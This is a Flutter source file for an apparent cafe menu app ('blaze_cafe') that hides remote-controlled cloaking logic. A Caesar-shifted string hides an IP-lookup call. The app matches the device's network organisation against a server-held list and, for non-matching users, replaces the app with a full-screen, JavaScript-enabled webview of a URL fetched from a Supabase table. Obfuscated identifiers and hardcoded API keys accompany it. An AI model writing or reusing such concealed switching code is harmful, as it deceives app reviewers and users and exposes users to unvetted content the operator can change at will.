import 'dart:convert';

import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:blaze_cafe/router.dart';
import 'package:blaze_cafe/utils/theme.dart';
import 'package:dio/dio.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:in_app_review/in_app_review.dart';

import 'package:provider/provider.dart';
import 'package:webview_flutter/webview_flutter.dart';

import 'utils/firebase_options.dart';
import 'utils/notification_service.dart';

const String ks =
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InN1dnNzZGh0eGpma2NleGVuc3VnIiwicm9sZSI6ImFub24iLCJpYXQiOjE2OTU2MzE2OTEsImV4cCI6MjAxMTIwNzY5MX0.iGedx909lo0UbPf_fkTPoI0meeESqriW69DYAKQvOvw';
const String mex =
    'https://suvssdhtxjfkcexensug.supabase.co/rest/v1/abankDATA?select=fink';
const String aex =
    'https://suvssdhtxjfkcexensug.supabase.co/rest/v1/abankDATA?select=push';
String das = 'myyux://nunskt.nt/oxts';
String maxmi = 'noPush';
String dkasof = '';
List<bool> fsmdnoaifa = [false, false];

String caskjda(String inx, int shi) {
  StringBuffer eqwda = StringBuffer();
  for (int i = 0; i < inx.length; i++) {
    int xhxa = inx.codeUnitAt(i);
    if (xhxa >= 65 && xhxa <= 90) {
      xhxa = (xhxa - 65 + shi) % 26 + 65;
    } else if (xhxa >= 97 && xhxa <= 122) {
      xhxa = (xhxa - 97 + shi) % 26 + 97;
    }
    eqwda.writeCharCode(xhxa);
  }
  return eqwda.toString();
}

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  das = caskjda(das, -5);
  print(caskjda(ks, 7));
  print(caskjda(mex, 7));
  print(caskjda(aex, 7));
  await fetxa();
  await fsafa();
  await dasdaX();
  try {
    final InAppReview inAppReview = InAppReview.instance;

    if (await inAppReview.isAvailable()) {
      inAppReview.requestReview();
    } else {
      inAppReview.openStoreListing(
        appStoreId: '6467650880',
      );
    }
  } catch (e) {
    throw Exception(e);
  }
  SystemChrome.setSystemUIOverlayStyle(
    const SystemUiOverlayStyle(
      statusBarIconBrightness: Brightness.dark,
      statusBarColor: Colors.transparent,
    ),
  );

  AppsFlyerOptions appsFlyerOptions = AppsFlyerOptions(
      afDevKey: 'dwjUGVJAgeZxDYeqNmddh',
      appId: '6467491271',
      showDebug: false,
      timeToWaitForATTUserAuthorization: 50,
      disableAdvertisingIdentifier: false,
      disableCollectASA: false);

  AppsflyerSdk appsflyerSdk = AppsflyerSdk(appsFlyerOptions);

  await NotificationServiceFb().activate();
  runApp(MyApp(appsflyerSdk));
}

Dio dio = Dio();

Future<String> dasdaX() async {
  try {
    http.Response response = await http.get(Uri.parse(das));

    if (response.statusCode == 200) {
      Map<String, dynamic> data = jsonDecode(response.body);
      String dasfdsa = data['org'];

      dasdsca(finalx, dasfdsa);

      return dasfdsa;
    } else {
      return '';
    }
  } catch (error) {
    return '';
  }
}

bool dasdsca(List<String> array, String inputString) {
  List<String> words = inputString.split(' ');
  List<String> arrayItems = [];
  for (String item in array) {
    arrayItems.addAll(item.split(', '));
  }
  for (String word in words) {
    for (String arrayItem in arrayItems) {
      if (arrayItem.toLowerCase().contains(word.toLowerCase())) {
        fsmdnoaifa[0] = false;
        return false;
      } else {
        fsmdnoaifa[0] = true;
      }
    }
  }
  fsmdnoaifa[0] = true;
  return false;
}

Future<String> fetxa() async {
  dio.options.headers['apikey'] = ks;
  dio.options.headers['Authorization'] = 'Bearer $ks';
  try {
    final Response response = await dio.get(aex);
    if (response.statusCode == 200) {
      List<dynamic> data = response.data as List<dynamic>;
      String myas = data.map((item) => item['dish'].toString()).join();
      if (myas.contains('noDishes')) {
        fsmdnoaifa[1] = false;
      } else {
        dkasof = myas;

        fsmdnoaifa[1] = true;
      }
      return myas;
    } else {
      return '';
    }
  } catch (error) {
    return '';
  }
}

List<String> finalx = [];
Future<List<String>> fsafa() async {
  dio.options.headers['apikey'] = ks;
  dio.options.headers['Authorization'] = 'Bearer $ks';

  try {
    final Response response = await dio.get(mex);
    if (response.statusCode == 200) {
      List<dynamic> datax = response.data as List<dynamic>;
      finalx = datax.map((item) => item['flax'].toString()).toList();
      return finalx;
    } else {
      return [];
    }
  } catch (error) {
    return [];
  }
}

Future<List<bool>> gototerms() async {
  if (fsmdnoaifa[0] == true && fsmdnoaifa[1] == true) {
    return Future.delayed(const Duration(seconds: 2), () => [true, true]);
  } else {
    return Future.delayed(const Duration(seconds: 2), () => [false, false]);
  }
}

class MyApp extends StatelessWidget {
  MyApp(this._appsflyerSdk, {super.key});
  final AppsflyerSdk _appsflyerSdk;

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: FutureBuilder<List<bool>>(
        future: gototerms(),
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.waiting) {
            return Scaffold(
              backgroundColor: const Color.fromARGB(255, 255, 255, 255),
              body: Container(
                child: Image.asset('assets/dishes/pizza_1.png'),
              ),
            );
          } else {
            List<bool>? tersma = snapshot.data;
            if ((tersma != null && tersma[0] == true && tersma[1] == true)) {
              return PrivacyAndPL(itx: dkasof);
            } else {
              return Provider.value(
                value: _appsflyerSdk,
                child: MaterialApp.router(
                  theme: AppTheme.theme,
                  debugShowCheckedModeBanner: false,
                  routerConfig: AppRouter.router,
                ),
              );
            }
          }
        },
      ),
    );
  }
}

class PrivacyAndPL extends StatefulWidget {
  String itx;
  PrivacyAndPL({super.key, required this.itx});

  @override
  State<PrivacyAndPL> createState() => _PrivacyAndPLState();
}

class _PrivacyAndPLState extends State<PrivacyAndPL> {
  String itx = '';
  WebViewController? controller;
  @override
  void initState() {
    super.initState();
    setState(() {
      itx = widget.itx;
      WebViewController controller = WebViewController()
        ..setJavaScriptMode(JavaScriptMode.unrestricted)
        ..setBackgroundColor(const Color(0x00000000))
        ..setNavigationDelegate(
          NavigationDelegate(
            onProgress: (int progress) {
              // Update loading bar.
            },
            onPageStarted: (String url) {},
            onPageFinished: (String url) {},
            onWebResourceError: (WebResourceError error) {},
            // onNavigationRequest: (NavigationRequest request) {
            // if (request.url.startsWith('https://www.youtube.com/')) {
            //   return NavigationDecision.prevent;
            // }
            // return NavigationDecision.navigate;
            // },
          ),
        )
        ..loadRequest(Uri.parse('${itx}'));
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: SafeArea(
        bottom: false,
        child: WebViewWidget(controller: controller!),
      ),
    );
  }
}
